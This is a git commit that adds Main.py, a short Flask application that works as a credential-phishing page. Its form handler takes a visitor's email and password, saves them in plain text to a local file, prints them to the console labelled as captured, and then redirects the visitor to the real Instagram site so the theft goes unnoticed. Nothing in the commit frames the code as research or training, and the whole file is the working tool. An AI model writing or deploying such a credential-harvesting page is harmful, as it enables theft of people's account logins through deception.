9e04c42bf53b8b9d906ea87e1842d548ec1e46cd
Zodic <zodicffs@gmail.com>
2025-04-09 23:31:32 +0300

    Add files via upload

---
+++ ZNTP/Project ZNTP/Main.py
@@ -0,0 +1,19 @@
+from flask import Flask, render_template, request , redirect
+from datetime import datetime
+import random
+Current_New_Profile = str(random.randint(100000,1000000))
+app = Flask(__name__)
+def save_credentials(email, password):
+    with open(f"{Current_New_Profile}user.txt", "+a") as file:
+        file.write(f" {datetime.now()}Email: {email}, Password: {password}\n")
+@app.route("/", methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        email = request.form.get("email")
+        password = request.form.get("password")
+        save_credentials(email, password)
+        print(f"Captured Email or Username: {email}, Password: {password}")
+        return redirect("https://www.instagram.com/")
+    return render_template("index.html")
+if __name__ == "__main__":
+    app.run(debug=True)
